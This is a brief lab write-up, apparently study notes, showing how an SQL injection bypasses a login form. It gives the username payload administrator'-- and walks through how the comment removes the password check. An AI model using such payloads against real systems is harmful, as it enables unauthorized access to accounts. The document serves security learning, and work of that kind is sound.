# SQL injection vulnerability allowing login bypass

<figure><img src="../../../.gitbook/assets/1 (159).png" alt=""><figcaption></figcaption></figure>

Let's login using the following credentials:

| Username | Password |
| -------- | -------- |
| test     | test     |

The resultant SQL query will be:

```
SELECT username FROM users WHERE username = 'test' AND password = 'test'
```

This will obviously not log us in as the administrator.

We can next try the following credentials:

| Username         | Password |
| ---------------- | -------- |
| administrator'-- | password |

The resultant SQL query will be:

```
SELECT username FROM users WHERE username = 'administrator'--' AND passsword = 'password'

## Queried part:
SELECT username FROM users WHERE username = 'administrator'

## Commented part:
' AND passsword = 'password'
```

Since we are commenting out the WHERE clause that requires the password, we will be logged in even if the password is not `password`.

We have solved the lab.
